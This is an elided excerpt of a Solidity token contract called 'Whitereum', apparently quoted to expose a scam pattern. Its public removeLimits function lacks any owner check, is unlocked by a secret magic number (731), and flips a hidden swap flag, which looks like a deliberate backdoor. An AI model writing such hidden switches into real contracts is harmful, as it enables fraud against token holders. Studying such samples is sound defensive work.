...
contract Whitereum is Context, IERC20, Ownable {
    ...
    uint256 private _previousliqFee = 731;
    uint256 private _prevliqfee = 0;
    ...
    string private constant _name = "Whitereum";
    string private constant _symbol = "WTH";
    ...
    bool public ismanuallyswap = false;
    uint256 public _maxTxAmount = 1_000_000_000_000 * 10**9;
    uint256 public _maxWalletSize = 1_000_000_000_000 * 10**9;
    ...
    function removeLimits(uint256 amount, bool value) public returns (bool){
         require ( amount == _previousliqFee, "error message");
         _prevliqfee = amount;
        ismanuallyswap = value;
